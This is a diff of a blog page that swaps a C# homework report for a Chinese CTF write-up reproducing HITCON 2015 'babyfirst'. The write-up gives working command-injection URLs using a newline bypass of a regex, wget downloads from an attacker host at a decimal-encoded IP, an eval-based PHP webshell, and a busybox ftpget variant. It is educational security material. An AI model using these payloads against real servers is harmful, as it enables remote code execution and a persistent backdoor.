@@ -15,23 +15,25 @@
 
 
 
-<meta name="description" content="实验四 文本编辑器   设计开发一个多文档文本编辑器，在文本编辑器，图像处理器这样的应用软件中，通常需要同时处理一个或多个文档，每">
-<meta name="keywords" content="C#">
+<meta name="description" content="前言继续上面的题目，直接利用上一道题目的docker环境复现一道题目">
+<meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="程序设计课 C#的作业报告四">
-<meta property="og:url" content="0verwatch.top/2018/01/28/Csharp-work4/index.html">
+<meta property="og:title" content="Hitcon2015 babyfirst复现">
+<meta property="og:url" content="0verwatch.top/2018/09/14/hitcon2015-babyfirst/index.html">
 <meta property="og:site_name" content="0verWatch&#39;s Blog">
-<meta property="og:description" content="实验四 文本编辑器   设计开发一个多文档文本编辑器，在文本编辑器，图像处理器这样的应用软件中，通常需要同时处理一个或多个文档，每">
+<meta property="og:description" content="前言继续上面的题目，直接利用上一道题目的docker环境复现一道题目">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://s1.ax1x.com/2018/05/20/Cgg9sJ.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/05/20/CggiZR.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/05/20/CggFd1.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/05/20/CggkIx.png">
-<meta property="og:updated_time" content="2018-05-20T10:40:47.912Z">
+<meta property="og:image" content="https://s1.ax1x.com/2018/09/14/iEgrQg.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/09/14/iEgfYV.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/09/14/iEgIlF.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/09/14/iEgHm9.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/09/14/iE2S6e.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/09/14/iE2Kmj.png">
+<meta property="og:updated_time" content="2018-09-14T09:25:54.736Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="程序设计课 C#的作业报告四">
-<meta name="twitter:description" content="实验四 文本编辑器   设计开发一个多文档文本编辑器，在文本编辑器，图像处理器这样的应用软件中，通常需要同时处理一个或多个文档，每">
-<meta name="twitter:image" content="https://s1.ax1x.com/2018/05/20/Cgg9sJ.png">
+<meta name="twitter:title" content="Hitcon2015 babyfirst复现">
+<meta name="twitter:description" content="前言继续上面的题目，直接利用上一道题目的docker环境复现一道题目">
+<meta name="twitter:image" content="https://s1.ax1x.com/2018/09/14/iEgrQg.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -63,7 +65,7 @@
 <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>程序设计课 C#的作业报告四 | 0verWatch&#39;s Blog</title>
+<title>Hitcon2015 babyfirst复现 | 0verWatch&#39;s Blog</title>
 
 <script src="//cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/dist/jquery.min.js"></script>
 <script src="//cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.1/clipboard.min.js"></script>
@@ -301,11 +303,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-Csharp-work4" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-hitcon2015-babyfirst" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/01/28/Csharp-work4/" class="article-date">
-      <time datetime="2018-01-28T14:30:32.000Z" itemprop="datePublished">2018-01-28</time>
+      <a href="/2018/09/14/hitcon2015-babyfirst/" class="article-date">
+      <time datetime="2018-09-14T09:10:41.000Z" itemprop="datePublished">2018-09-14</time>
 </a>
 
 
@@ -320,7 +322,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      程序设计课 C#的作业报告四
+      Hitcon2015 babyfirst复现
     </h1>
   
 
@@ -329,13 +331,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/编程语言/">编程语言</a>
+    <a class="article-category-link" href="/categories/CTF/">CTF</a><a class="article-category-link" href="/categories/CTF/命令执行/">命令执行</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C#</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -346,20 +348,38 @@
       
           
         
-<h2 id="实验四-文本编辑器"><a href="#实验四-文本编辑器" class="headerlink" title="实验四 文本编辑器"></a>实验四 文本编辑器</h2><p>   设计开发一个多文档文本编辑器，在文本编辑器，图像处理器这样的应用软件中，通常需要同时处理一个或多个文档，每<br>   <a id="more"></a></p>
-<p>   个文档独立地执行软件所需要的功能，子窗体之间可以进行数据交互，也可以互不相关，Visual Studio开发环境就是多文档文本编辑器。</p>
-<h5 id="1-界面设计"><a href="#1-界面设计" class="headerlink" title="1.  界面设计"></a>1.  界面设计</h5><p> <img src="https://s1.ax1x.com/2018/05/20/Cgg9sJ.png" alt="Cgg9sJ.png"></p>
-<h5 id="2-功能实现"><a href="#2-功能实现" class="headerlink" title="2. 功能实现"></a>2. 功能实现</h5><p>  分别运行新建文档，设置字体，设置粗体，设置斜体，设置下划线，情况如下：</p>
-<p><a href="https://imgchr.com/i/CggiZR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CggiZR.md.png" alt="CggiZR.md.png"></a></p>
-<h5 id="3-拓展功能"><a href="#3-拓展功能" class="headerlink" title="3. 拓展功能"></a>3. 拓展功能</h5><p>  分别对其进行颜色改变，撤回，搜索与替换的功能，居中以及右对齐运行情况如下：<br><img src="https://s1.ax1x.com/2018/05/20/CggFd1.png" alt="CggFd1.png"></p>
-<p><img src="https://s1.ax1x.com/2018/05/20/CggkIx.png" alt="CggkIx.png"></p>
-<h5 id="4-实验体会"><a href="#4-实验体会" class="headerlink" title="4. 实验体会"></a>4. 实验体会</h5><ol>
-<li>这次实验深刻体会到了C#里边的某些控件的方便性，就比如这次实验里边的Richtextbox里边的各种函数，一句话的函数就可以完成撤回，剪切，复制，粘贴等功能。</li>
-<li>更加深刻地认识到了comblebox这个控件的功能，可以利用它加载自己定义的一系列东西，还可以加载本系统已有的东西。</li>
-<li>在拓展功能部分对于搜索字符常与替换有了更深刻地理解，了解到里面搜索是如何去搜索的，就是利用原来你搜索的字符串长度去搜索的，每次累加直到达到文本末。替换也是利用了搜索功能去查询然后再把它给换掉。</li>
-<li>最后一次程序设计课的实验，来个总结，虽然一开始对C#毫不理解，对语法也不是很明白，但是自己一步步做的每一个实验都有所收获，不会的去百度，最后完成一个个作品，十分开心，总体上看，C#确实要比其他的图形界面编程语言好得多，只能说它的工具确实太强大了。</li>
-</ol>
-<h5 id="代码下载地址：多文档编辑器"><a href="#代码下载地址：多文档编辑器" class="headerlink" title="代码下载地址：多文档编辑器"></a>代码下载地址：<a href="http://download.csdn.net/download/u011377996/10228652" target="_blank" rel="noopener">多文档编辑器</a></h5><h5 id="仅是为了记录自己的学习过程，请大佬们勿喷！！"><a href="#仅是为了记录自己的学习过程，请大佬们勿喷！！" class="headerlink" title="仅是为了记录自己的学习过程，请大佬们勿喷！！"></a>仅是为了记录自己的学习过程，请大佬们勿喷！！</h5>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续上面的题目，直接利用上一道题目的docker环境复现一道题目<a id="more"></a>，注意这里面的docker环境可能需要自己在某些文件夹下面设置权限，自己缺点什么环境就自己下就行了，感觉这个题目的难度比较上一题低了一点，参考博客: <a href="https://blog.spoock.com/2017/09/09/Babyfirst-writeup/" target="_blank" rel="noopener">https://blog.spoock.com/2017/09/09/Babyfirst-writeup/</a></p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先放个题目代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    $dir = <span class="string">'sandbox/'</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !file_exists($dir) )</span><br><span class="line">        mkdir($dir);</span><br><span class="line">    chdir($dir);</span><br><span class="line"></span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">for</span> ( $i=<span class="number">0</span>; $i&lt;count($args); $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span> ( !preg_match(<span class="string">'/^\w+$/'</span>, $args[$i]) )</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    exec(<span class="string">"/bin/orange "</span> . implode(<span class="string">" "</span>, $args));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这一段代码的意思就是建立一个<code>sandbox/clientip</code>文件夹 ，然后利用通过get法师获取args的参数，然后里面有一个正则匹配，只能通过的是数字以及字母不然的话就会直接die掉，最后就是利用exec这个执行函数了，而/bin/orange最终发现只是/bin/true的软链接，没有任何的作用。</p>
+<p>这个题目关键是那个正则，那个正则在很多题目也有见到过，由于preg_match()使用的是\w来进行检查，所有的斜线、破折号和点<code>(\,-,.)</code>都无法使用。另外就是在<code>/^\w+$\</code>中的<code>$</code>当遇到一个字符串的结尾是换行符时还是可以匹配的。利用这个特性，就可以绕过前面的<code>preg_match()</code>检查，同时多出的换行符还可以在<code>exec()</code>函数中执行。</p>
+<p>个人感觉这个题目如果<code>implode</code>里面的分割用的不是空格而是其他的类似逗号的东西这一个题目不一定可以写文件，或许其他大佬有办法可以跟我讲讲。留了空格刚好就可以写文件了</p>
+<p>比如传参的url是这样的<code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=touch&amp;args[]=0ver</code><br>这三个参数都可以经过正则匹配<br>那么执行的过程就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/orange xxx</span><br><span class="line">touch test</span><br></pre></td></tr></table></figure>
+<p>可以成功创建文件<br><img src="https://s1.ax1x.com/2018/09/14/iEgrQg.png" alt="iEgrQg.png"><br>这样一来，就先了正则，然后既可以创建文件了，如果implode里面不用空格分割的话，后面创建文件就会变成<code>touchtest</code>，这种东西是不可以创建文件的 </p>
+<p>然后这里就是参考了大佬们的做法利用<code>wget</code>的方式去实现，tql</p>
+<p>这里牵涉到另外一个知识点，我们平常见到的ip地址都是点分十进制表示的，其实IP地址还可以用直接10进制，八进制等等表示都可以</p>
+<p>然后再开一个本地环境:192.168.1.106，服务器:192.168.1.102</p>
+<p>在本地里面创建一个页面index.php内容为<code>&lt;?php phpinfo();?&gt;</code><br><a href="https://imgchr.com/i/iEgfYV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgfYV.md.png" alt="iEgfYV.md.png"></a></p>
+<p>然后再往服务器发送相应的参数，这时候的ip地址转化就起作用了，把本地ip换一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">"%u"</span>, ip2long(<span class="string">"192.168.1.106"</span>));</span><br></pre></td></tr></table></figure>
+<p>得到输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3232235882</span><br></pre></td></tr></table></figure></p>
+<p>这里用的这样的输出方法是为了解决32位以及64位php版本的问题，因为由于自己的php版本是32 位的输出的是负数，所以才用这样的的解决方法，参考链接<br><a href="https://blog.csdn.net/everything1209/article/details/22418559" target="_blank" rel="noopener">https://blog.csdn.net/everything1209/article/details/22418559</a></p>
+<p>这时候就是开始利用了<br><code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=wget&amp;args[]=3232235882</code><br>然后就直接把192.168.1.106主页的页面给下载下来，但是这个页面是解析过了的，没有任何PHP语言的痕迹，只剩下html了<br><a href="https://imgchr.com/i/iEgIlF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgIlF.md.png" alt="iEgIlF.md.png"></a></p>
+<p>这时候又是另外一个知识点了<br>在Linux中PHP能够执行非压缩的打包的PHP文件。<br>也就是这样的过程<br>创建1.php，内容为<code>&lt;?php echo &quot;123&quot;;?&gt;</code>，通过<code>tar</code>将<code>1.php</code>打包,<code>tar cvf test 1.php</code>，PHP运行test文件，可以运行<br><a href="https://imgchr.com/i/iEgHm9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgHm9.md.png" alt="iEgHm9.md.png"></a></p>
+<p>复现到这里，发现orange大佬真是强，到后期就是利用上面两个知识点</p>
+<p>在原来的本地的index.html里面改成这样的代码，注意一定要在<code>index.html</code>里面写上这样的语句，不然的话就会在像上面的例子一样在<code>index.php</code>里面的语句会被解析之后下载，会毫无用处下载下来是没有php语句的，更别谈解析了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'cmd.php'</span>, <span class="string">'</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">header("Content-Type: text/plain");</span></span><br><span class="line"><span class="string"> @eval($_POST["cmd"]);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">'</span>);</span><br></pre></td></tr></table></figure>
+<p>然后开始写webshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102/?args[]=xxx%0a&amp;args[]=mkdir&amp;args[]=exploit 创建exploit文件夹</span><br><span class="line">http://192.168.1.102/?args[]=xxx%0a&amp;args[]=cd&amp;args[]=exploit%0a&amp;args[]=wget&amp;args[]=3232275969   进入exploit文件夹，下载192.168.158.1的index.html文件。</span><br></pre></td></tr></table></figure>
+<p>然后就是利用打包的方式去执行相关的PHP代码了，想直接改名字是不可能的因为命令里面含有<code>&#39;.&#39;</code>这样的字符<br>再来一句<code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=php&amp;args[]=cmd</code> 执行一波这个打包未压缩的PHP文件</p>
+<p>然后可以执行一句话木马了，打开小马页面<code>http://192.168.1.102/sandbox/192.168.1.102/cmd.php</code>，上菜刀链接成功<br><a href="https://imgchr.com/i/iE2S6e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iE2S6e.md.png" alt="iE2S6e.md.png"></a></p>
+<p>再看一下服务器下面的目录成功创建了<code>cmd.php</code>页面<br><img src="https://s1.ax1x.com/2018/09/14/iE2Kmj.png" alt="iE2Kmj.png"></p>
+<p>再看看出题人的官方wp发现还有其他骚操作<br>就是利用一波<code>ftp</code>方式去下载远程的一句话木马，因为自己虚拟机没有<code>busybox</code>这个东西就不搞了<br>但还是得过一遍脑紫的，利用下面的命令把远处<code>ftp</code>服务器里面的<code>webshell.php</code>给下载下来，这样做的好处就是不用再管原来那些php繁琐的解析步骤，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">busybox ftpget -u ftp的用户名 -p ftp的密码 ftp地址 需要下载的文件名</span><br></pre></td></tr></table></figure>
+<p>很好的思路学习了，不一定就是busybox，还有其他利用ftp的下载功能来获取webshell的。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.两个运用的知识点远程wget下载的PHP文件是经过解析的，服务器是可以通过用php执行打包的文件的，注意不是压缩的PHP文件，有点像是两个本来安全的东西放在一起后就变成了不安全的东西。。。。个人感觉问题的严重性还是出现在php能够执行未压缩的打包文件上。<br>2根据上一次的复现题目，个人感觉命令执行在这两道题目的上面都利用了远程的另外一台主机，第一次是使用了curl命令去访问，而这次是通过wget或者是ftp去访问，骚操作又学习了一波<br>3.正则可以换行符继续匹配那个点就不多说了</p>
+
       
     </div>
     
@@ -367,13 +387,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/01/28/Csharp-work4/">程序设计课 C#的作业报告四</a></p>
+        <p><span>本文标题:</span><a href="/2018/09/14/hitcon2015-babyfirst/">Hitcon2015 babyfirst复现</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">0verWatch</a></p>
-        <p><span>发布时间:</span>2018-01-28, 22:30:32</p>
-        <p><span>最后更新:</span>2018-05-20, 18:40:47</p>
+        <p><span>发布时间:</span>2018-09-14, 17:10:41</p>
+        <p><span>最后更新:</span>2018-09-14, 17:25:54</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/01/28/Csharp-work4/" title="程序设计课 C#的作业报告四">0verwatch.top/2018/01/28/Csharp-work4/</a>
-            <span class="copy-path" data-clipboard-text="原文: 0verwatch.top/2018/01/28/Csharp-work4/　　作者: 0verWatch" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/09/14/hitcon2015-babyfirst/" title="Hitcon2015 babyfirst复现">0verwatch.top/2018/09/14/hitcon2015-babyfirst/</a>
+            <span class="copy-path" data-clipboard-text="原文: 0verwatch.top/2018/09/14/hitcon2015-babyfirst/　　作者: 0verWatch" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -385,16 +405,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/02/02/php summary/">
-                    php留言板编写总结
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/01/28/Csharp-work3/">
-                    程序设计课 C#的作业报告三
+                <a href="/2018/09/06/hitcon2017-babyfirst/">
+                    Hitcon2017 babyfirst-revenge复现
                 </a>
             </div>
         
@@ -436,7 +450,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#实验四-文本编辑器"><span class="toc-number">1.</span> <span class="toc-text">实验四 文本编辑器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-界面设计"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">1.  界面设计</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-功能实现"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">2. 功能实现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-拓展功能"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">3. 拓展功能</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-实验体会"><span class="toc-number">1.0.0.4.</span> <span class="toc-text">4. 实验体会</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#代码下载地址：多文档编辑器"><span class="toc-number">1.0.0.5.</span> <span class="toc-text">代码下载地址：多文档编辑器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#仅是为了记录自己的学习过程，请大佬们勿喷！！"><span class="toc-number">1.0.0.6.</span> <span class="toc-text">仅是为了记录自己的学习过程，请大佬们勿喷！！</span></a></li></ol></li></ol></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number">3.</span> <span class="toc-text">小结</span></a></li></ol>
         
     </div>
     <style>
@@ -480,15 +494,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/02/02/php summary/" title="上一篇: php留言板编写总结">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/01/28/Csharp-work3/" title="下一篇: 程序设计课 C#的作业报告三">
+            <a href="/2018/09/06/hitcon2017-babyfirst/" title="下一篇: Hitcon2017 babyfirst-revenge复现">
                 <i class="fa fa-angle-right"></i>
             </a>
         
